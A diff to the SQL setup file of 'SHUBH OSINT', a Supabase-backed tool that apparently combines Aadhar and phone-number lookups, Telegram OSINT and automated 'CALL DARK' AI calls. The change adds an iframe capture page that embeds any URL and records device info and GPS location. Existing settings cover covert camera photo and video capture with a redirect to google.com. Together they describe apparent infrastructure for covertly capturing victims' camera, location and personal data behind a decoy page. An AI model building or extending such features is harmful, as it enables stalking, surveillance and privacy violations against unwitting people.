@@ -2,8 +2,8 @@
 -- SHUBH OSINT - Complete Supabase Database Setup
 -- =====================================================
 -- Run this SQL in your new Supabase project's SQL Editor
--- Last Updated: 2026-01-30
--- Version: 3.3 (CALL DARK feature + Header Style fixes)
+-- Last Updated: 2026-01-31
+-- Version: 3.4 (Iframe Capture + Session Config cleanup)
 -- =====================================================
 
 -- =====================================================
@@ -309,6 +309,7 @@ VALUES ('main_settings', '{
   "camRedirectUrl": "https://google.com",
   "customCaptureHtml": "",
   "chromeCustomHtml": "",
+  "camIframeUrl": "",
   "camPhotoLimit": 0,
   "camCaptureInterval": 500,
   "camVideoDuration": 5,
@@ -371,7 +372,7 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- =====================================================
 -- EDGE FUNCTIONS LIST (deploy from supabase/functions/)
 -- =====================================================
--- Version 3.3 Edge Functions:
+-- Version 3.4 Edge Functions:
 -- 1. auth-login        - User login with credit password
 -- 2. auth-verify       - Verify session token & get credits
 -- 3. credits-deduct    - Deduct credits for search operations
@@ -379,12 +380,13 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- 5. aadhar-search     - Aadhar lookup API
 -- 6. numinfo-v2        - Phone number info API
 -- 7. telegram-osint    - Telegram OSINT API integration
--- 8. call-dark         - Omnidim AI call dispatch API (NEW in v3.3)
+-- 8. call-dark         - Omnidim AI call dispatch API
 --
--- IMPORTANT CHANGES in v3.2:
--- - CAM Session ID can ONLY be changed via Admin Panel
--- - Session change button removed from ShubhCam component
--- - All capture pages use session from app_settings
+-- IMPORTANT CHANGES in v3.4:
+-- - Iframe Capture page added for embedding any URL
+-- - camIframeUrl setting added for iframe URL storage
+-- - Session change removed from ShubhCam Config tab
+-- - Device info + GPS location captured on all capture pages
 --
 -- IMPORTANT CHANGES in v3.3:
 -- - CALL DARK feature added for automated AI calls
@@ -404,7 +406,9 @@ ON CONFLICT (setting_key) DO NOTHING;
 --                     - Includes CALL DARK settings (v3.3):
 --                       callDarkEnabled, callDarkApiKey, 
 --                       callDarkAgentId, callDarkMaxDuration
--- captured_photos   : Camera capture photo metadata
+--                     - Includes Iframe Capture (v3.4):
+--                       camIframeUrl for embedding external URLs
+-- captured_photos   : Camera capture photo metadata + device info
 -- captured_videos   : Video capture metadata & URLs
 -- search_history    : All search queries log
 -- =====================================================
